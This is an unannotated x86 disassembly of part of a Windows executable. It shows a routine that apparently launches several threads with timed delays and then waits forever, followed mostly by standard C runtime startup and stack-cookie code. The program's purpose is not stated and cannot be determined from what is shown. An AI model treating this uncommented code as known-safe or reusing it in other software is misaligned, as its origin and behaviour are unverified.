  401724:	6a 00                	push   $0x0
  401726:	6a 00                	push   $0x0
  401728:	6a 00                	push   $0x0
  40172a:	68 40 12 40 00       	push   $0x401240
  40172f:	6a 00                	push   $0x0
  401731:	6a 00                	push   $0x0
  401733:	ff d6                	call   *%esi
  401735:	68 80 38 01 00       	push   $0x13880
  40173a:	ff d7                	call   *%edi
  40173c:	6a 00                	push   $0x0
  40173e:	6a 00                	push   $0x0
  401740:	6a 00                	push   $0x0
  401742:	68 70 12 40 00       	push   $0x401270
  401747:	6a 00                	push   $0x0
  401749:	6a 00                	push   $0x0
  40174b:	ff d6                	call   *%esi
  40174d:	6a 00                	push   $0x0
  40174f:	6a 00                	push   $0x0
  401751:	6a 00                	push   $0x0
  401753:	68 30 15 40 00       	push   $0x401530
  401758:	6a 00                	push   $0x0
  40175a:	6a 00                	push   $0x0
  40175c:	ff d6                	call   *%esi
  40175e:	68 88 13 00 00       	push   $0x1388
  401763:	ff d7                	call   *%edi
  401765:	6a 00                	push   $0x0
  401767:	6a 00                	push   $0x0
  401769:	6a 00                	push   $0x0
  40176b:	68 a0 17 40 00       	push   $0x4017a0
  401770:	6a 00                	push   $0x0
  401772:	6a 00                	push   $0x0
  401774:	ff d6                	call   *%esi
  401776:	6a 00                	push   $0x0
  401778:	6a 00                	push   $0x0
  40177a:	68 a0 12 41 00       	push   $0x4112a0
  40177f:	68 10 0f 41 00       	push   $0x410f10
  401784:	6a 00                	push   $0x0
  401786:	6a 00                	push   $0x0
  401788:	ff 15 50 c1 40 00    	call   *0x40c150
  40178e:	6a ff                	push   $0xffffffff
  401790:	ff d7                	call   *%edi
  401792:	5f                   	pop    %edi
  401793:	5e                   	pop    %esi
  401794:	c2 10 00             	ret    $0x10
  401797:	cc                   	int3
  401798:	cc                   	int3
  401799:	cc                   	int3
  40179a:	cc                   	int3
  40179b:	cc                   	int3
  40179c:	cc                   	int3
  40179d:	cc                   	int3
  40179e:	cc                   	int3
  40179f:	cc                   	int3
  4017a0:	53                   	push   %ebx
  4017a1:	8b 1d 28 c0 40 00    	mov    0x40c028,%ebx
  4017a7:	56                   	push   %esi
  4017a8:	57                   	push   %edi
  4017a9:	8b 3d 44 c0 40 00    	mov    0x40c044,%edi
  4017af:	be 06 00 00 00       	mov    $0x6,%esi
  4017b4:	6a 06                	push   $0x6
  4017b6:	ff d7                	call   *%edi
  4017b8:	6a 64                	push   $0x64
  4017ba:	ff d3                	call   *%ebx
  4017bc:	83 ee 01             	sub    $0x1,%esi
  4017bf:	75 f3                	jne    0x4017b4
  4017c1:	5f                   	pop    %edi
  4017c2:	8d 46 01             	lea    0x1(%esi),%eax
  4017c5:	5e                   	pop    %esi
  4017c6:	5b                   	pop    %ebx
  4017c7:	c3                   	ret
  4017c8:	3b 0d 04 30 41 00    	cmp    0x413004,%ecx
  4017ce:	f2 75 02             	bnd jne 0x4017d3
  4017d1:	f2 c3                	bnd ret
  4017d3:	f2 e9 58 02 00 00    	bnd jmp 0x401a31
  4017d9:	56                   	push   %esi
  4017da:	6a 02                	push   $0x2
  4017dc:	e8 1f 16 00 00       	call   0x402e00
  4017e1:	e8 6b 06 00 00       	call   0x401e51
  4017e6:	50                   	push   %eax
  4017e7:	e8 31 1f 00 00       	call   0x40371d
  4017ec:	e8 5d 20 00 00       	call   0x40384e
  4017f1:	8b f0                	mov    %eax,%esi
  4017f3:	e8 5f 06 00 00       	call   0x401e57
  4017f8:	6a 01                	push   $0x1
  4017fa:	89 06                	mov    %eax,(%esi)
  4017fc:	e8 fa 03 00 00       	call   0x401bfb
  401801:	83 c4 0c             	add    $0xc,%esp
  401804:	5e                   	pop    %esi
  401805:	84 c0                	test   %al,%al
  401807:	74 6c                	je     0x401875
  401809:	db e2                	fnclex
  40180b:	e8 a0 08 00 00       	call   0x4020b0
  401810:	68 db 20 40 00       	push   $0x4020db
  401815:	e8 82 05 00 00       	call   0x401d9c
  40181a:	e8 2e 06 00 00       	call   0x401e4d
  40181f:	50                   	push   %eax
  401820:	e8 6f 19 00 00       	call   0x403194
  401825:	59                   	pop    %ecx
  401826:	59                   	pop    %ecx
  401827:	85 c0                	test   %eax,%eax
  401829:	75 4a                	jne    0x401875
  40182b:	e8 2a 06 00 00       	call   0x401e5a
  401830:	e8 7b 06 00 00       	call   0x401eb0
  401835:	85 c0                	test   %eax,%eax
  401837:	74 0b                	je     0x401844
  401839:	68 57 1e 40 00       	push   $0x401e57
  40183e:	e8 42 16 00 00       	call   0x402e85
  401843:	59                   	pop    %ecx
  401844:	e8 85 0f 00 00       	call   0x4027ce
  401849:	e8 80 0f 00 00       	call   0x4027ce
  40184e:	e8 13 06 00 00       	call   0x401e66
  401853:	e8 ff 05 00 00       	call   0x401e57
  401858:	50                   	push   %eax
  401859:	e8 59 1f 00 00       	call   0x4037b7
  40185e:	59                   	pop    %ecx
  40185f:	e8 22 24 00 00       	call   0x403c86
  401864:	84 c0                	test   %al,%al
  401866:	74 05                	je     0x40186d
  401868:	e8 5c 1b 00 00       	call   0x4033c9
  40186d:	e8 e5 05 00 00       	call   0x401e57
  401872:	33 c0                	xor    %eax,%eax
  401874:	c3                   	ret
  401875:	6a 07                	push   $0x7
  401877:	e8 4c 06 00 00       	call   0x401ec8
  40187c:	cc                   	int3
  40187d:	e8 11 06 00 00       	call   0x401e93
  401882:	33 c0                	xor    %eax,%eax
  401884:	c3                   	ret
  401885:	e8 d1 07 00 00       	call   0x40205b
  40188a:	e8 c8 05 00 00       	call   0x401e57
  40188f:	50                   	push   %eax
  401890:	e8 8a 1f 00 00       	call   0x40381f
  401895:	59                   	pop    %ecx
  401896:	c3                   	ret
  401897:	6a 14                	push   $0x14
  401899:	68 e0 16 41 00       	push   $0x4116e0
  40189e:	e8 6d 08 00 00       	call   0x402110
  4018a3:	6a 01                	push   $0x1
  4018a5:	e8 18 03 00 00       	call   0x401bc2
  4018aa:	59                   	pop    %ecx
  4018ab:	84 c0                	test   %al,%al
  4018ad:	75 07                	jne    0x4018b6
  4018af:	6a 07                	push   $0x7
  4018b1:	e8 12 06 00 00       	call   0x401ec8
  4018b6:	32 db                	xor    %bl,%bl
  4018b8:	88 5d e7             	mov    %bl,-0x19(%ebp)
  4018bb:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4018bf:	e8 c9 02 00 00       	call   0x401b8d
  4018c4:	88 45 dc             	mov    %al,-0x24(%ebp)
  4018c7:	a1 9c 3a 41 00       	mov    0x413a9c,%eax
  4018cc:	33 c9                	xor    %ecx,%ecx
  4018ce:	41                   	inc    %ecx
  4018cf:	3b c1                	cmp    %ecx,%eax
  4018d1:	74 dc                	je     0x4018af
  4018d3:	85 c0                	test   %eax,%eax
  4018d5:	75 49                	jne    0x401920
  4018d7:	89 0d 9c 3a 41 00    	mov    %ecx,0x413a9c
  4018dd:	68 88 c1 40 00       	push   $0x40c188
  4018e2:	68 70 c1 40 00       	push   $0x40c170
  4018e7:	e8 84 1b 00 00       	call   0x403470
  4018ec:	59                   	pop    %ecx
  4018ed:	59                   	pop    %ecx
  4018ee:	85 c0                	test   %eax,%eax
  4018f0:	74 11                	je     0x401903
  4018f2:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4018f9:	b8 ff 00 00 00       	mov    $0xff,%eax
  4018fe:	e9 f6 00 00 00       	jmp    0x4019f9
  401903:	68 6c c1 40 00       	push   $0x40c16c
  401908:	68 64 c1 40 00       	push   $0x40c164
  40190d:	e8 02 1b 00 00       	call   0x403414
  401912:	59                   	pop    %ecx
  401913:	59                   	pop    %ecx
  401914:	c7 05 9c 3a 41 00 02 	movl   $0x2,0x413a9c
  40191b:	00 00 00 
  40191e:	eb 05                	jmp    0x401925
  401920:	8a d9                	mov    %cl,%bl
  401922:	88 5d e7             	mov    %bl,-0x19(%ebp)
  401925:	ff 75 dc             	push   -0x24(%ebp)
  401928:	e8 ef 03 00 00       	call   0x401d1c
  40192d:	59                   	pop    %ecx
  40192e:	e8 89 05 00 00       	call   0x401ebc
  401933:	8b f0                	mov    %eax,%esi
  401935:	33 ff                	xor    %edi,%edi
  401937:	39 3e                	cmp    %edi,(%esi)
  401939:	74 1a                	je     0x401955
  40193b:	56                   	push   %esi
  40193c:	e8 51 03 00 00       	call   0x401c92
  401941:	59                   	pop    %ecx
  401942:	84 c0                	test   %al,%al
  401944:	74 0f                	je     0x401955
  401946:	57                   	push   %edi
  401947:	6a 02                	push   $0x2
  401949:	57                   	push   %edi
  40194a:	8b 36                	mov    (%esi),%esi
  40194c:	8b ce                	mov    %esi,%ecx
  40194e:	e8 b3 07 00 00       	call   0x402106
  401953:	ff d6                	call   *%esi
  401955:	e8 68 05 00 00       	call   0x401ec2
  40195a:	8b f0                	mov    %eax,%esi
  40195c:	39 3e                	cmp    %edi,(%esi)
  40195e:	74 13                	je     0x401973
  401960:	56                   	push   %esi
  401961:	e8 2c 03 00 00       	call   0x401c92
  401966:	59                   	pop    %ecx
  401967:	84 c0                	test   %al,%al
  401969:	74 08                	je     0x401973
  40196b:	ff 36                	push   (%esi)
  40196d:	e8 5d 1d 00 00       	call   0x4036cf
  401972:	59                   	pop    %ecx
  401973:	e8 6c 06 00 00       	call   0x401fe4
  401978:	0f b7 c0             	movzwl %ax,%eax
  40197b:	50                   	push   %eax
  40197c:	e8 4d 1a 00 00       	call   0x4033ce
  401981:	50                   	push   %eax
  401982:	57                   	push   %edi
  401983:	68 00 00 40 00       	push   $0x400000
  401988:	e8 53 fd ff ff       	call   0x4016e0
  40198d:	8b f0                	mov    %eax,%esi
  40198f:	e8 83 06 00 00       	call   0x402017
  401994:	84 c0                	test   %al,%al
  401996:	75 06                	jne    0x40199e
  401998:	56                   	push   %esi
  401999:	e8 69 1d 00 00       	call   0x403707
  40199e:	84 db                	test   %bl,%bl
  4019a0:	75 05                	jne    0x4019a7
  4019a2:	e8 03 1d 00 00       	call   0x4036aa
  4019a7:	57                   	push   %edi
  4019a8:	6a 01                	push   $0x1
  4019aa:	e8 8a 03 00 00       	call   0x401d39
  4019af:	59                   	pop    %ecx
  4019b0:	59                   	pop    %ecx
  4019b1:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4019b8:	8b c6                	mov    %esi,%eax
  4019ba:	eb 3d                	jmp    0x4019f9
  4019bc:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4019bf:	8b 01                	mov    (%ecx),%eax
  4019c1:	8b 00                	mov    (%eax),%eax
  4019c3:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4019c6:	51                   	push   %ecx
  4019c7:	50                   	push   %eax
  4019c8:	e8 ba 12 00 00       	call   0x402c87
  4019cd:	59                   	pop    %ecx
  4019ce:	59                   	pop    %ecx
  4019cf:	c3                   	ret
  4019d0:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4019d3:	e8 3f 06 00 00       	call   0x402017
  4019d8:	84 c0                	test   %al,%al
  4019da:	75 08                	jne    0x4019e4
  4019dc:	ff 75 e0             	push   -0x20(%ebp)
  4019df:	e8 d5 1c 00 00       	call   0x4036b9
  4019e4:	80 7d e7 00          	cmpb   $0x0,-0x19(%ebp)
  4019e8:	75 05                	jne    0x4019ef
  4019ea:	e8 ac 1c 00 00       	call   0x40369b
  4019ef:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4019f6:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4019f9:	e8 58 07 00 00       	call   0x402156
  4019fe:	c3                   	ret
  4019ff:	e8 ad 03 00 00       	call   0x401db1
  401a04:	e9 8e fe ff ff       	jmp    0x401897
  401a09:	55                   	push   %ebp
  401a0a:	8b ec                	mov    %esp,%ebp
  401a0c:	6a 00                	push   $0x0
  401a0e:	ff 15 78 c0 40 00    	call   *0x40c078
  401a14:	ff 75 08             	push   0x8(%ebp)
  401a17:	ff 15 74 c0 40 00    	call   *0x40c074
  401a1d:	68 09 04 00 c0       	push   $0xc0000409
  401a22:	ff 15 2c c0 40 00    	call   *0x40c02c
  401a28:	50                   	push   %eax
  401a29:	ff 15 7c c0 40 00    	call   *0x40c07c
  401a2f:	5d                   	pop    %ebp
  401a30:	c3                   	ret
  401a31:	55                   	push   %ebp
  401a32:	8b ec                	mov    %esp,%ebp
  401a34:	81 ec 24 03 00 00    	sub    $0x324,%esp
  401a3a:	6a 17                	push   $0x17
  401a3c:	e8 6b 8e 00 00       	call   0x40a8ac
  401a41:	85 c0                	test   %eax,%eax
  401a43:	74 05                	je     0x401a4a
  401a45:	6a 02                	push   $0x2
  401a47:	59                   	pop    %ecx
  401a48:	cd 29                	int    $0x29
  401a4a:	a3 80 38 41 00       	mov    %eax,0x413880
  401a4f:	89 0d 7c 38 41 00    	mov    %ecx,0x41387c
  401a55:	89 15 78 38 41 00    	mov    %edx,0x413878
  401a5b:	89 1d 74 38 41 00    	mov    %ebx,0x413874
  401a61:	89 35 70 38 41 00    	mov    %esi,0x413870
  401a67:	89 3d 6c 38 41 00    	mov    %edi,0x41386c
  401a6d:	66 8c 15 98 38 41 00 	data16 mov %ss,0x413898
  401a74:	66 8c 0d 8c 38 41 00 	data16 mov %cs,0x41388c
  401a7b:	66 8c 1d 68 38 41 00 	data16 mov %ds,0x413868
  401a82:	66 8c 05 64 38 41 00 	data16 mov %es,0x413864
  401a89:	66 8c 25 60 38 41 00 	data16 mov %fs,0x413860
  401a90:	66 8c 2d 5c 38 41 00 	data16 mov %gs,0x41385c
  401a97:	9c                   	pushf
  401a98:	8f 05 90 38 41 00    	pop    0x413890
  401a9e:	8b 45 00             	mov    0x0(%ebp),%eax
  401aa1:	a3 84 38 41 00       	mov    %eax,0x413884
  401aa6:	8b 45 04             	mov    0x4(%ebp),%eax
  401aa9:	a3 88 38 41 00       	mov    %eax,0x413888
  401aae:	8d 45 08             	lea    0x8(%ebp),%eax
  401ab1:	a3 94 38 41 00       	mov    %eax,0x413894
  401ab6:	8b 85 dc fc ff ff    	mov    -0x324(%ebp),%eax
  401abc:	c7 05 d0 37 41 00 01 	movl   $0x10001,0x4137d0
  401ac3:	00 01 00 
  401ac6:	a1 88 38 41 00       	mov    0x413888,%eax
  401acb:	a3 8c 37 41 00       	mov    %eax,0x41378c
  401ad0:	c7 05 80 37 41 00 09 	movl   $0xc0000409,0x413780
  401ad7:	04 00 c0 
  401ada:	c7 05 84 37 41 00 01 	movl   $0x1,0x413784
  401ae1:	00 00 00 
  401ae4:	c7 05 90 37 41 00 01 	movl   $0x1,0x413790
  401aeb:	00 00 00 
  401aee:	6a 04                	push   $0x4
  401af0:	58                   	pop    %eax
  401af1:	6b c0 00             	imul   $0x0,%eax,%eax
  401af4:	c7 80 94 37 41 00 02 	movl   $0x2,0x413794(%eax)
  401afb:	00 00 00 
  401afe:	6a 04                	push   $0x4
  401b00:	58                   	pop    %eax
  401b01:	6b c0 00             	imul   $0x0,%eax,%eax
  401b04:	8b 0d 04 30 41 00    	mov    0x413004,%ecx
  401b0a:	89 4c 05 f8          	mov    %ecx,-0x8(%ebp,%eax,1)
  401b0e:	6a 04                	push   $0x4
  401b10:	58                   	pop    %eax
  401b11:	c1 e0 00             	shl    $0x0,%eax
  401b14:	8b 0d 00 30 41 00    	mov    0x413000,%ecx
  401b1a:	89 4c 05 f8          	mov    %ecx,-0x8(%ebp,%eax,1)
  401b1e:	68 b0 c1 40 00       	push   $0x40c1b0
  401b23:	e8 e1 fe ff ff       	call   0x401a09
  401b28:	8b e5                	mov    %ebp,%esp
  401b2a:	5d                   	pop    %ebp
  401b2b:	c3                   	ret
  401b2c:	55                   	push   %ebp
  401b2d:	8b ec                	mov    %esp,%ebp
  401b2f:	a1 04 30 41 00       	mov    0x413004,%eax
  401b34:	83 e0 1f             	and    $0x1f,%eax
  401b37:	6a 20                	push   $0x20
  401b39:	59                   	pop    %ecx
  401b3a:	2b c8                	sub    %eax,%ecx
  401b3c:	8b 45 08             	mov    0x8(%ebp),%eax
  401b3f:	d3 c8                	ror    %cl,%eax
  401b41:	33 05 04 30 41 00    	xor    0x413004,%eax
  401b47:	5d                   	pop    %ebp
  401b48:	c3                   	ret
  401b49:	55                   	push   %ebp
  401b4a:	8b ec                	mov    %esp,%ebp
  401b4c:	8b 45 08             	mov    0x8(%ebp),%eax
  401b4f:	56                   	push   %esi
  401b50:	8b 48 3c             	mov    0x3c(%eax),%ecx
  401b53:	03 c8                	add    %eax,%ecx
  401b55:	0f b7 41 14          	movzwl 0x14(%ecx),%eax
  401b59:	8d 51 18             	lea    0x18(%ecx),%edx
  401b5c:	03 d0                	add    %eax,%edx
  401b5e:	0f b7 41 06          	movzwl 0x6(%ecx),%eax
  401b62:	6b f0 28             	imul   $0x28,%eax,%esi
  401b65:	03 f2                	add    %edx,%esi
  401b67:	3b d6                	cmp    %esi,%edx
  401b69:	74 19                	je     0x401b84
  401b6b:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401b6e:	3b 4a 0c             	cmp    0xc(%edx),%ecx
  401b71:	72 0a                	jb     0x401b7d
  401b73:	8b 42 08             	mov    0x8(%edx),%eax
  401b76:	03 42 0c             	add    0xc(%edx),%eax
  401b79:	3b c8                	cmp    %eax,%ecx
  401b7b:	72 0c                	jb     0x401b89
  401b7d:	83 c2 28             	add    $0x28,%edx
  401b80:	3b d6                	cmp    %esi,%edx
  401b82:	75 ea                	jne    0x401b6e
  401b84:	33 c0                	xor    %eax,%eax
  401b86:	5e                   	pop    %esi
  401b87:	5d                   	pop    %ebp
  401b88:	c3                   	ret
  401b89:	8b c2                	mov    %edx,%eax
  401b8b:	eb f9                	jmp    0x401b86
  401b8d:	e8 7d 07 00 00       	call   0x40230f
  401b92:	85 c0                	test   %eax,%eax
  401b94:	75 03                	jne    0x401b99
  401b96:	32 c0                	xor    %al,%al
  401b98:	c3                   	ret
  401b99:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
  401b9f:	56                   	push   %esi
  401ba0:	be a0 3a 41 00       	mov    $0x413aa0,%esi
  401ba5:	8b 50 04             	mov    0x4(%eax),%edx
  401ba8:	eb 04                	jmp    0x401bae
  401baa:	3b d0                	cmp    %eax,%edx
  401bac:	74 10                	je     0x401bbe
  401bae:	33 c0                	xor    %eax,%eax
  401bb0:	8b ca                	mov    %edx,%ecx
  401bb2:	f0 0f b1 0e          	lock cmpxchg %ecx,(%esi)
  401bb6:	85 c0                	test   %eax,%eax
  401bb8:	75 f0                	jne    0x401baa
  401bba:	32 c0                	xor    %al,%al
  401bbc:	5e                   	pop    %esi
  401bbd:	c3                   	ret
  401bbe:	b0 01                	mov    $0x1,%al
  401bc0:	5e                   	pop    %esi
  401bc1:	c3                   	ret
  401bc2:	55                   	push   %ebp
  401bc3:	8b ec                	mov    %esp,%ebp
  401bc5:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  401bc9:	75 07                	jne    0x401bd2
  401bcb:	c6 05 bc 3a 41 00 01 	movb   $0x1,0x413abc
  401bd2:	e8 94 05 00 00       	call   0x40216b
  401bd7:	e8 ea 08 00 00       	call   0x4024c6
  401bdc:	84 c0                	test   %al,%al
  401bde:	75 04                	jne    0x401be4
  401be0:	32 c0                	xor    %al,%al
  401be2:	5d                   	pop    %ebp
  401be3:	c3                   	ret
  401be4:	e8 65 21 00 00       	call   0x403d4e
  401be9:	84 c0                	test   %al,%al
  401beb:	75 0a                	jne    0x401bf7
  401bed:	6a 00                	push   $0x0
  401bef:	e8 fb 08 00 00       	call   0x4024ef
  401bf4:	59                   	pop    %ecx
  401bf5:	eb e9                	jmp    0x401be0
  401bf7:	b0 01                	mov    $0x1,%al
  401bf9:	5d                   	pop    %ebp
  401bfa:	c3                   	ret
  401bfb:	55                   	push   %ebp
  401bfc:	8b ec                	mov    %esp,%ebp
  401bfe:	83 ec 0c             	sub    $0xc,%esp
  401c01:	56                   	push   %esi
  401c02:	8b 75 08             	mov    0x8(%ebp),%esi
  401c05:	85 f6                	test   %esi,%esi
  401c07:	74 05                	je     0x401c0e
  401c09:	83 fe 01             	cmp    $0x1,%esi
  401c0c:	75 7c                	jne    0x401c8a
  401c0e:	e8 fc 06 00 00       	call   0x40230f
  401c13:	85 c0                	test   %eax,%eax
  401c15:	74 2a                	je     0x401c41
  401c17:	85 f6                	test   %esi,%esi
  401c19:	75 26                	jne    0x401c41
  401c1b:	68 a4 3a 41 00       	push   $0x413aa4
  401c20:	e8 d4 1f 00 00       	call   0x403bf9
  401c25:	59                   	pop    %ecx
  401c26:	85 c0                	test   %eax,%eax
  401c28:	74 04                	je     0x401c2e
  401c2a:	32 c0                	xor    %al,%al
  401c2c:	eb 57                	jmp    0x401c85
  401c2e:	68 b0 3a 41 00       	push   $0x413ab0
  401c33:	e8 c1 1f 00 00       	call   0x403bf9
  401c38:	f7 d8                	neg    %eax
  401c3a:	59                   	pop    %ecx
  401c3b:	1a c0                	sbb    %al,%al
  401c3d:	fe c0                	inc    %al
  401c3f:	eb 44                	jmp    0x401c85
  401c41:	a1 04 30 41 00       	mov    0x413004,%eax
  401c46:	8d 75 f4             	lea    -0xc(%ebp),%esi
  401c49:	57                   	push   %edi
  401c4a:	83 e0 1f             	and    $0x1f,%eax
  401c4d:	bf a4 3a 41 00       	mov    $0x413aa4,%edi
  401c52:	6a 20                	push   $0x20
  401c54:	59                   	pop    %ecx
  401c55:	2b c8                	sub    %eax,%ecx
  401c57:	83 c8 ff             	or     $0xffffffff,%eax
  401c5a:	d3 c8                	ror    %cl,%eax
  401c5c:	33 05 04 30 41 00    	xor    0x413004,%eax
  401c62:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401c65:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401c68:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401c6b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401c6c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401c6d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401c6e:	bf b0 3a 41 00       	mov    $0x413ab0,%edi
  401c73:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401c76:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401c79:	8d 75 f4             	lea    -0xc(%ebp),%esi
  401c7c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401c7f:	b0 01                	mov    $0x1,%al
  401c81:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401c82:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401c83:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401c84:	5f                   	pop    %edi
  401c85:	5e                   	pop    %esi
  401c86:	8b e5                	mov    %ebp,%esp
  401c88:	5d                   	pop    %ebp
  401c89:	c3                   	ret
  401c8a:	6a 05                	push   $0x5
  401c8c:	e8 37 02 00 00       	call   0x401ec8
  401c91:	cc                   	int3
  401c92:	6a 08                	push   $0x8
  401c94:	68 00 17 41 00       	push   $0x411700
  401c99:	e8 72 04 00 00       	call   0x402110
  401c9e:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  401ca2:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
  401ca7:	66 39 05 00 00 40 00 	cmp    %ax,0x400000
  401cae:	75 5d                	jne    0x401d0d
  401cb0:	a1 3c 00 40 00       	mov    0x40003c,%eax
  401cb5:	81 b8 00 00 40 00 50 	cmpl   $0x4550,0x400000(%eax)
  401cbc:	45 00 00 
  401cbf:	75 4c                	jne    0x401d0d
  401cc1:	b9 0b 01 00 00       	mov    $0x10b,%ecx
  401cc6:	66 39 88 18 00 40 00 	cmp    %cx,0x400018(%eax)
  401ccd:	75 3e                	jne    0x401d0d
  401ccf:	8b 45 08             	mov    0x8(%ebp),%eax
  401cd2:	b9 00 00 40 00       	mov    $0x400000,%ecx
  401cd7:	2b c1                	sub    %ecx,%eax
  401cd9:	50                   	push   %eax
  401cda:	51                   	push   %ecx
  401cdb:	e8 69 fe ff ff       	call   0x401b49
  401ce0:	59                   	pop    %ecx
  401ce1:	59                   	pop    %ecx
  401ce2:	85 c0                	test   %eax,%eax
  401ce4:	74 27                	je     0x401d0d
  401ce6:	83 78 24 00          	cmpl   $0x0,0x24(%eax)
  401cea:	7c 21                	jl     0x401d0d
  401cec:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  401cf3:	b0 01                	mov    $0x1,%al
  401cf5:	eb 1f                	jmp    0x401d16
  401cf7:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401cfa:	8b 00                	mov    (%eax),%eax
  401cfc:	33 c9                	xor    %ecx,%ecx
  401cfe:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%eax)
  401d04:	0f 94 c1             	sete   %cl
  401d07:	8b c1                	mov    %ecx,%eax
  401d09:	c3                   	ret
  401d0a:	8b 65 e8             	mov    -0x18(%ebp),%esp
  401d0d:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  401d14:	32 c0                	xor    %al,%al
  401d16:	e8 3b 04 00 00       	call   0x402156
  401d1b:	c3                   	ret
  401d1c:	55                   	push   %ebp
  401d1d:	8b ec                	mov    %esp,%ebp
  401d1f:	e8 eb 05 00 00       	call   0x40230f
  401d24:	85 c0                	test   %eax,%eax
  401d26:	74 0f                	je     0x401d37
  401d28:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
  401d2c:	75 09                	jne    0x401d37
  401d2e:	33 c0                	xor    %eax,%eax
  401d30:	b9 a0 3a 41 00       	mov    $0x413aa0,%ecx
  401d35:	87 01                	xchg   %eax,(%ecx)
  401d37:	5d                   	pop    %ebp
  401d38:	c3                   	ret
  401d39:	55                   	push   %ebp
  401d3a:	8b ec                	mov    %esp,%ebp
  401d3c:	80 3d bc 3a 41 00 00 	cmpb   $0x0,0x413abc
  401d43:	74 06                	je     0x401d4b
  401d45:	80 7d 0c 00          	cmpb   $0x0,0xc(%ebp)
  401d49:	75 12                	jne    0x401d5d
  401d4b:	ff 75 08             	push   0x8(%ebp)
  401d4e:	e8 0d 20 00 00       	call   0x403d60
  401d53:	ff 75 08             	push   0x8(%ebp)
  401d56:	e8 94 07 00 00       	call   0x4024ef
  401d5b:	59                   	pop    %ecx
  401d5c:	59                   	pop    %ecx
  401d5d:	b0 01                	mov    $0x1,%al
  401d5f:	5d                   	pop    %ebp
  401d60:	c3                   	ret
  401d61:	55                   	push   %ebp
  401d62:	8b ec                	mov    %esp,%ebp
  401d64:	a1 04 30 41 00       	mov    0x413004,%eax
  401d69:	8b c8                	mov    %eax,%ecx
  401d6b:	33 05 a4 3a 41 00    	xor    0x413aa4,%eax
  401d71:	83 e1 1f             	and    $0x1f,%ecx
  401d74:	ff 75 08             	push   0x8(%ebp)
  401d77:	d3 c8                	ror    %cl,%eax
  401d79:	83 f8 ff             	cmp    $0xffffffff,%eax
  401d7c:	75 07                	jne    0x401d85
  401d7e:	e8 43 1e 00 00       	call   0x403bc6
  401d83:	eb 0b                	jmp    0x401d90
  401d85:	68 a4 3a 41 00       	push   $0x413aa4
  401d8a:	e8 a7 1e 00 00       	call   0x403c36
  401d8f:	59                   	pop    %ecx
  401d90:	f7 d8                	neg    %eax
  401d92:	59                   	pop    %ecx
  401d93:	1b c0                	sbb    %eax,%eax
  401d95:	f7 d0                	not    %eax
  401d97:	23 45 08             	and    0x8(%ebp),%eax
  401d9a:	5d                   	pop    %ebp
  401d9b:	c3                   	ret
  401d9c:	55                   	push   %ebp
  401d9d:	8b ec                	mov    %esp,%ebp
  401d9f:	ff 75 08             	push   0x8(%ebp)
  401da2:	e8 ba ff ff ff       	call   0x401d61
  401da7:	f7 d8                	neg    %eax
  401da9:	59                   	pop    %ecx
  401daa:	1b c0                	sbb    %eax,%eax
  401dac:	f7 d8                	neg    %eax
  401dae:	48                   	dec    %eax
  401daf:	5d                   	pop    %ebp
  401db0:	c3                   	ret
  401db1:	55                   	push   %ebp
  401db2:	8b ec                	mov    %esp,%ebp
  401db4:	83 ec 14             	sub    $0x14,%esp
  401db7:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  401dbb:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  401dbf:	a1 04 30 41 00       	mov    0x413004,%eax
  401dc4:	56                   	push   %esi
  401dc5:	57                   	push   %edi
  401dc6:	bf 4e e6 40 bb       	mov    $0xbb40e64e,%edi
  401dcb:	be 00 00 ff ff       	mov    $0xffff0000,%esi
  401dd0:	3b c7                	cmp    %edi,%eax
  401dd2:	74 0d                	je     0x401de1
  401dd4:	85 c6                	test   %eax,%esi
  401dd6:	74 09                	je     0x401de1
  401dd8:	f7 d0                	not    %eax
  401dda:	a3 00 30 41 00       	mov    %eax,0x413000
  401ddf:	eb 66                	jmp    0x401e47
  401de1:	8d 45 f4             	lea    -0xc(%ebp),%eax
  401de4:	50                   	push   %eax
  401de5:	ff 15 90 c0 40 00    	call   *0x40c090
  401deb:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401dee:	33 45 f4             	xor    -0xc(%ebp),%eax
  401df1:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401df4:	ff 15 8c c0 40 00    	call   *0x40c08c
  401dfa:	31 45 fc             	xor    %eax,-0x4(%ebp)
  401dfd:	ff 15 88 c0 40 00    	call   *0x40c088
  401e03:	31 45 fc             	xor    %eax,-0x4(%ebp)
  401e06:	8d 45 ec             	lea    -0x14(%ebp),%eax
  401e09:	50                   	push   %eax
  401e0a:	ff 15 84 c0 40 00    	call   *0x40c084
  401e10:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  401e13:	8d 45 fc             	lea    -0x4(%ebp),%eax
  401e16:	33 4d ec             	xor    -0x14(%ebp),%ecx
  401e19:	33 4d fc             	xor    -0x4(%ebp),%ecx
  401e1c:	33 c8                	xor    %eax,%ecx
